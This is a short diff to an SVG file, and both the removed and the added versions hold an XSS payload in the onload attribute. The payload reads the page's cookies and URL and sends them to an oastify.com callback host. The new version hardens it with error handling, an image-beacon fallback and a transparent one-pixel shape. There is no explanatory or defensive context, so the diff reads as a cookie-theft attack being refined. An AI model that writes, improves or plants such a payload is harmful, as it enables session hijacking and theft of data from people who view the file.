@@ -1,5 +1,1 @@
-<svg onload="
-var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://q5w0pwwvwwpmts8urr2kia3lvc15pwdl.oastify.com/exfil?cookies=' + encodeURIComponent(document.cookie) + '&url=' + encodeURIComponent(window.location.href), true);
-xhr.send();
-">
+<svg xmlns="http://www.w3.org/2000/svg" onload="try{var d=document.cookie||'no-cookies';var u=window.location.href||'unknown-url';var xhr=new XMLHttpRequest();xhr.open('GET','https://q5w0pwwvwwpmts8urr2kia3lvc15pwdl.oastify.com/exfil?cookies='+encodeURIComponent(d)+'&url='+encodeURIComponent(u)+'&status=success',true);xhr.onerror=function(){try{new Image().src='https://q5w0pwwvwwpmts8urr2kia3lvc15pwdl.oastify.com/backup?error=xhr-failed&cookies='+encodeURIComponent(d)}catch(e){}};xhr.send()}catch(e){try{new Image().src='https://q5w0pwwvwwpmts8urr2kia3lvc15pwdl.oastify.com/error?msg='+encodeURIComponent(e.message||'unknown-error')}catch(e2){}}"><rect width="1" height="1" fill="transparent"/></svg>
